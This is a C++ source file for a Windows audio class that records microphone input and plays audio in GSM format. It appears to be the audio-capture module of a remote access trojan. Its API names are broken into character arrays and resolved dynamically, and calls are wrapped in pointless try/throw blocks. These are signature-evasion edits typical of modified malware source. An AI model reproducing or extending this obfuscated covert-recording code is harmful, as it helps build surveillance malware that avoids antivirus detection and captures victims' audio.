// Audio.cpp: implementation of the CAudio class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "Audio.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CAudio::CAudio()
{
	typedef __out HANDLE (WINAPI *CreateEventAT)
		(
		__in_opt LPSECURITY_ATTRIBUTES lpEventAttributes,
		__in     BOOL bManualReset,
		__in     BOOL bInitialState,
		__in_opt LPCSTR lpName
		);
	char DEtLjaQ[] = {'C','r','e','a','t','e','E','v','e','n','t','A','\0'};
	CreateEventAT pCreateEventA = (CreateEventAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DEtLjaQ);

	m_hEventWaveIn		= pCreateEventA(NULL, false, false, NULL);
	m_hStartRecord		= pCreateEventA(NULL, false, false, NULL);
	m_hThreadCallBack	= NULL;
	m_nWaveInIndex		= 0;
	m_nWaveOutIndex		= 0;
	m_nBufferLength		= 1000; // m_GSMWavefmt.wfx.nSamplesPerSec / 8(bit)

	m_bIsWaveInUsed		= false;
	m_bIsWaveOutUsed	= false;

	for (int i = 0; i < 2; i++)
	{
		m_lpInAudioData[i] = new BYTE[m_nBufferLength];
		m_lpInAudioHdr[i] = new WAVEHDR;

		m_lpOutAudioData[i] = new BYTE[m_nBufferLength];
		m_lpOutAudioHdr[i] = new WAVEHDR;
	}
	
	memset(&m_GSMWavefmt, 0, sizeof(GSM610WAVEFORMAT));

	m_GSMWavefmt.wfx.wFormatTag = WAVE_FORMAT_GSM610; // ACM will auto convert wave format
	m_GSMWavefmt.wfx.nChannels = 1;
	m_GSMWavefmt.wfx.nSamplesPerSec = 8000;
	m_GSMWavefmt.wfx.nAvgBytesPerSec = 1625;
	m_GSMWavefmt.wfx.nBlockAlign = 65;
	m_GSMWavefmt.wfx.wBitsPerSample = 0;
	m_GSMWavefmt.wfx.cbSize = 2;
	m_GSMWavefmt.wSamplesPerBlock = 320;
}

CAudio::~CAudio()
{
	typedef  BOOL (WINAPI *TerminateThreadT)
		(
		__in HANDLE hThread, __in DWORD dwExitCode
		);
	TerminateThreadT pTerminateThread = (TerminateThreadT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"TerminateThread");

	typedef BOOL (WINAPI *CloseHandleT)
		(
		__in HANDLE hObject
		);
	char DDZGlGm[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DDZGlGm);
	
	typedef MMRESULT
		(WINAPI
		*waveOutCloseT)(
		IN OUT HWAVEOUT hwo);
	waveOutCloseT pwaveOutClose=(waveOutCloseT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveOutClose");
	
	typedef MMRESULT
		(WINAPI
		*waveInStopT)(
		IN HWAVEIN hwi);	
	waveInStopT pwaveInStop=(waveInStopT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveInStop");

	typedef MMRESULT
		(WINAPI
		*waveInResetT)(
		IN HWAVEIN hwi);	
	waveInResetT pwaveInReset=(waveInResetT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveInReset");
	
	typedef MMRESULT
		(WINAPI
		*waveInUnprepareHeaderT)(
		IN HWAVEIN hwi,
		IN OUT LPWAVEHDR pwh,
		UINT cbwh);	
	waveInUnprepareHeaderT pwaveInUnprepareHeader=(waveInUnprepareHeaderT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveInUnprepareHeader");
	
	typedef MMRESULT
		(WINAPI
		*waveInCloseT)(
		IN OUT HWAVEIN hwi);
	waveInCloseT pwaveInClose=(waveInCloseT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveInClose");
	
	typedef MMRESULT
		(WINAPI
		*waveOutResetT)(
		IN HWAVEOUT hwo);
	waveOutResetT pwaveOutReset=(waveOutResetT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveOutReset");
	
	typedef MMRESULT
		(WINAPI
		*waveOutUnprepareHeaderT)(
		IN HWAVEOUT hwo,
		IN OUT LPWAVEHDR pwh,
		IN UINT cbwh);
	waveOutUnprepareHeaderT pwaveOutUnprepareHeader=(waveOutUnprepareHeaderT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveOutUnprepareHeader");

	if (m_bIsWaveInUsed)
	{
		pwaveInStop(m_hWaveIn);
		pwaveInReset(m_hWaveIn);
		for (int i = 0; i < 2; i++)
			pwaveInUnprepareHeader(m_hWaveIn, m_lpInAudioHdr[i], sizeof(WAVEHDR));
		pwaveInClose(m_hWaveIn);
		pTerminateThread(m_hThreadCallBack, -1);
	}

	if (m_bIsWaveOutUsed)
	{
		pwaveOutReset(m_hWaveOut);
		for (int i = 0; i < 2; i++)
			pwaveOutUnprepareHeader(m_hWaveOut, m_lpInAudioHdr[i], sizeof(WAVEHDR));
		pwaveOutClose(m_hWaveOut);
	}		


	for (int i = 0; i < 2; i++)
	{
		delete [] m_lpInAudioData[i];
		delete m_lpInAudioHdr[i];
		
		delete [] m_lpOutAudioData[i];
		delete m_lpOutAudioHdr[i];
	}

	
	try
	{
		if(1+1==2)throw 71;
	}
	catch (...)
	{
		pCloseHandle(m_hEventWaveIn);
		pCloseHandle(m_hStartRecord);
		pCloseHandle(m_hThreadCallBack);
	}

}

LPBYTE CAudio::getRecordBuffer(LPDWORD lpdwBytes)
{
	typedef BOOL (WINAPI *SetEventT)
		(
		__in HANDLE hEvent
		);
	SetEventT pSetEvent = (SetEventT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"SetEvent");

	typedef DWORD (WINAPI *WaitForSingleObjectT)
		(
		__in HANDLE hHandle,
		__in DWORD dwMilliseconds
		);
	char bcONXFi[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
	WaitForSingleObjectT pWaitForSingleObject = (WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),bcONXFi);
	// Not open WaveIn yet, so open it...
	if (!m_bIsWaveInUsed && !InitializeWaveIn())
		return NULL;

	if (lpdwBytes == NULL)
		return NULL;

	pSetEvent(m_hStartRecord);
	pWaitForSingleObject(m_hEventWaveIn, INFINITE);
	*lpdwBytes = m_nBufferLength;
	return	m_lpInAudioData[m_nWaveInIndex];
}

bool CAudio::playBuffer(LPBYTE lpWaveBuffer, DWORD dwBytes)
{
	
	typedef MMRESULT
		(WINAPI
		*waveOutWriteT)(
		IN HWAVEOUT hwo,
		IN OUT LPWAVEHDR pwh,
		IN UINT cbwh);
	waveOutWriteT pwaveOutWrite=(waveOutWriteT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveOutWrite");

	if (!m_bIsWaveOutUsed && !InitializeWaveOut())
		return NULL;

	for (int i = 0; i < dwBytes; i += m_nBufferLength)
	{
		memcpy(m_lpOutAudioData[m_nWaveOutIndex], lpWaveBuffer, m_nBufferLength);
		pwaveOutWrite(m_hWaveOut, m_lpOutAudioHdr[m_nWaveOutIndex], sizeof(WAVEHDR));
		m_nWaveOutIndex = 1 - m_nWaveOutIndex;
	}
	return true;
}
bool CAudio::InitializeWaveOut()
{
	
	typedef MMRESULT
		(WINAPI
		*waveOutOpenT)(
		OUT LPHWAVEOUT phwo,
		IN UINT uDeviceID,
		IN LPCWAVEFORMATEX pwfx,
		IN DWORD_PTR dwCallback,
		IN DWORD_PTR dwInstance,
		IN DWORD fdwOpen);
	waveOutOpenT pwaveOutOpen=(waveOutOpenT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveOutOpen");

	
	typedef MMRESULT
		(WINAPI
		*waveOutPrepareHeaderT)(
		IN HWAVEOUT hwo,
		IN OUT LPWAVEHDR pwh,
		IN UINT cbwh);
	waveOutPrepareHeaderT pwaveOutPrepareHeader=(waveOutPrepareHeaderT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveOutPrepareHeader");

	
	typedef UINT
		(WINAPI
		*waveOutGetNumDevsT)(
		void);
	waveOutGetNumDevsT pwaveOutGetNumDevs=(waveOutGetNumDevsT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveOutGetNumDevs");

	if (!pwaveOutGetNumDevs())
		return false;
	
	for (int i = 0; i < 2; i++)
		memset(m_lpOutAudioData[i], 0, m_nBufferLength);
	
	MMRESULT	mmResult;
	mmResult = pwaveOutOpen(&m_hWaveOut, (WORD)WAVE_MAPPER, &(m_GSMWavefmt.wfx), (LONG)0, (LONG)0, CALLBACK_NULL);
	if (mmResult != MMSYSERR_NOERROR)
		return false;
	
	for (i = 0; i < 2; i++)
	{
		m_lpOutAudioHdr[i]->lpData = (LPSTR)m_lpOutAudioData[i];
		m_lpOutAudioHdr[i]->dwBufferLength = m_nBufferLength;
		m_lpOutAudioHdr[i]->dwFlags = 0;
		m_lpOutAudioHdr[i]->dwLoops = 0;
		pwaveOutPrepareHeader(m_hWaveOut, m_lpOutAudioHdr[i], sizeof(WAVEHDR));
	}
	
	m_bIsWaveOutUsed = true;
	return true;
}
bool CAudio::InitializeWaveIn()
{
	typedef DWORD (WINAPI *ResumeThreadT)
		(
		__in HANDLE hThread
		);
	ResumeThreadT pResumeThread = (ResumeThreadT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"ResumeThread");

	typedef HANDLE
		(WINAPI
		*CreateThreadT)(
		__in_opt  LPSECURITY_ATTRIBUTES lpThreadAttributes,
		__in      SIZE_T dwStackSize,
		__in      LPTHREAD_START_ROUTINE lpStartAddress,
		__in_opt  LPVOID lpParameter,
		__in      DWORD dwCreationFlags,
		__out_opt LPDWORD lpThreadId
		);
	CreateThreadT pCreateThread=(CreateThreadT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateThread");

	
	typedef MMRESULT
		(WINAPI
		*waveInOpenT)(
		OUT LPHWAVEIN phwi,
		IN UINT uDeviceID,
		IN LPCWAVEFORMATEX pwfx,
		IN DWORD_PTR dwCallback,
		IN DWORD_PTR dwInstance,
		IN DWORD fdwOpen);
	waveInOpenT pwaveInOpen=(waveInOpenT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveInOpen");

	
	typedef UINT
		(WINAPI
		*waveInGetNumDevsT)(
		void);
	waveInGetNumDevsT pwaveInGetNumDevs=(waveInGetNumDevsT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveInGetNumDevs");

	
	typedef MMRESULT
		(WINAPI
		*waveInPrepareHeaderT)(
		IN HWAVEIN hwi,
		IN OUT LPWAVEHDR pwh,
		IN UINT cbwh);
	waveInPrepareHeaderT pwaveInPrepareHeader=(waveInPrepareHeaderT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveInPrepareHeader");

	
	typedef MMRESULT 
		(WINAPI 
		*waveInAddBufferT)(
		IN HWAVEIN hwi, 
		IN OUT LPWAVEHDR pwh, 
		IN UINT cbwh);
	waveInAddBufferT pwaveInAddBuffer=(waveInAddBufferT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveInAddBuffer");

	
	typedef MMRESULT 
		(WINAPI 
		*waveInStartT)(
		IN HWAVEIN hwi);
	waveInStartT pwaveInStart=(waveInStartT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveInStart");

	if (!pwaveInGetNumDevs())
		return false;

	MMRESULT	mmResult;
	DWORD		dwThreadID = 0;
	m_hThreadCallBack = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)waveInCallBack, (LPVOID)this, CREATE_SUSPENDED, &dwThreadID);
	mmResult = pwaveInOpen(&m_hWaveIn, (WORD)WAVE_MAPPER, &(m_GSMWavefmt.wfx), (LONG)dwThreadID, (LONG)0, CALLBACK_THREAD);

	if (mmResult != MMSYSERR_NOERROR)
		return false;

	for (int i = 0; i < 2; i++)
	{
		m_lpInAudioHdr[i]->lpData = (LPSTR)m_lpInAudioData[i];
		m_lpInAudioHdr[i]->dwBufferLength = m_nBufferLength;
		m_lpInAudioHdr[i]->dwFlags = 0;
		m_lpInAudioHdr[i]->dwLoops = 0;
		pwaveInPrepareHeader(m_hWaveIn, m_lpInAudioHdr[i], sizeof(WAVEHDR));
	}
	
	
	try
	{
		if(1+1==2)throw 75;
	}
	catch (...)
	{
		pwaveInAddBuffer(m_hWaveIn, m_lpInAudioHdr[m_nWaveInIndex], sizeof(WAVEHDR));
		
		pResumeThread(m_hThreadCallBack);
		pwaveInStart(m_hWaveIn);
		
	}

	m_bIsWaveInUsed = true;

	return true;

}



DWORD WINAPI CAudio::waveInCallBack( LPVOID lparam )
{
	typedef BOOL (WINAPI *SetEventT)
		(
		__in HANDLE hEvent
		);
	SetEventT pSetEvent = (SetEventT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"SetEvent");

	typedef DWORD (WINAPI *WaitForSingleObjectT)
		(
		__in HANDLE hHandle,
		__in DWORD dwMilliseconds
		);
	char bcONXFi[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
	WaitForSingleObjectT pWaitForSingleObject = (WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),bcONXFi);

	typedef BOOL (WINAPI *GetMessageAT)
		(
		__out LPMSG lpMsg,
		__in_opt HWND hWnd,
		__in UINT wMsgFilterMin,
		__in UINT wMsgFilterMax);
	GetMessageAT pGetMessageA= (GetMessageAT)GetProcAddress(LoadLibrary("user32.dll"),"GetMessageA");

	typedef MMRESULT 
		(WINAPI 
		*waveInAddBufferT)(
		IN HWAVEIN hwi, 
		IN OUT LPWAVEHDR pwh, 
		IN UINT cbwh);
	waveInAddBufferT pwaveInAddBuffer=(waveInAddBufferT)GetProcAddress(LoadLibrary("WINMM.dll"),"waveInAddBuffer");

	
	typedef BOOL
		(WINAPI
		*TranslateMessageT)(
		__in CONST MSG *lpMsg);
	TranslateMessageT pTranslateMessage=(TranslateMessageT)GetProcAddress(LoadLibrary("USER32.dll"),"TranslateMessage");

	
	typedef LRESULT
		(WINAPI
		*DispatchMessageAT)(
		__in CONST MSG *lpMsg);	
	DispatchMessageAT pDispatchMessageA=(DispatchMessageAT)GetProcAddress(LoadLibrary("USER32.dll"),"DispatchMessageA");

	CAudio	*pThis = (CAudio *)lparam;

	MSG	Msg;
	while (pGetMessageA(&Msg, NULL, 0, 0))
	{
		if (Msg.message == MM_WIM_DATA)
		{
			// 通知的数据到来
			pSetEvent(pThis->m_hEventWaveIn);
			// 等待开始下次录音
			pWaitForSingleObject(pThis->m_hStartRecord, INFINITE);

			pThis->m_nWaveInIndex = 1 - pThis->m_nWaveInIndex;
			
			MMRESULT mmResult = pwaveInAddBuffer(pThis->m_hWaveIn, pThis->m_lpInAudioHdr[pThis->m_nWaveInIndex], sizeof(WAVEHDR));
			if (mmResult != MMSYSERR_NOERROR)
				return -1;
			
		}

		// Why never happend this
		if (Msg.message == MM_WIM_CLOSE)
			break;

		pTranslateMessage(&Msg); 
		pDispatchMessageA(&Msg);
	}

	return 0;	
}